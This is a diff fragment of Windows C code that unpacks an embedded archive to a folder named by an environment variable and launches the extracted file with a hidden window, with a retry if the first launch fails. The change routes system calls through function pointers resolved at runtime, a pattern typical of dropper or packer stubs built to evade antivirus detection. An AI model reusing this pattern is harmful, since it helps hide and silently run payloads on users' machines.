-      uint8_t *packed=(uint8_t *)LocalAlloc(LMEM_ZEROINIT,res_size);
-      if(packed){
-        for(uint32_t i=0;i<res_size;i++) packed[i]=bytes2byte();
-        init_unpack(packed,res_size);
+      char *path=(char *)LocalAlloc(LMEM_ZEROINIT,MAX_PATH);
+      if(path){
+        GetEnvironmentVariableA(drv_e,path,257);
+        path[strlen_i(path)+1]=0;
+        path[strlen_i(path)]='/';
+        bytes2uint(res_size);
+        init_unpack(res_size);
         unarc(path);
         SHELLEXECUTEINFO ShExecInfo;
         ShExecInfo.cbSize=sizeof(SHELLEXECUTEINFO);
@@ -926,20 +908,20 @@ extern "C" void __stdcall start(){
         ShExecInfo.lpDirectory=NULL;
         ShExecInfo.nShow=0;
         ShExecInfo.hInstApp=0;
-        if(sea(&ShExecInfo)==FALSE){
+        if(((SEA)_f(sea))(&ShExecInfo)==FALSE){
           res_size=0;
           ShExecInfo.fMask=SEE_MASK_NOASYNC;
           ShExecInfo.lpVerb=NULL;
           ShExecInfo.lpParameters=sea_r;
-          sea(&ShExecInfo);
+          ((SEA)_f(sea))(&ShExecInfo);
         };
-        LocalFree(packed);
-      } else expw(1);
+        LocalFree(path);
+      };
     };
-    LocalFree(image);
   };
-  flib(hshell32);
-  flib(hgdi32);
-  flib(huser32);
-  if(!res_size) expw(0);
+  ((FLIB)_f(flib))(hshell32);
+  ((FLIB)_f(flib))(hgdi32);
+  ((FLIB)_f(flib))(huser32);
+  free_mem();
+  if(!res_size) ExitProcess(0);
 }
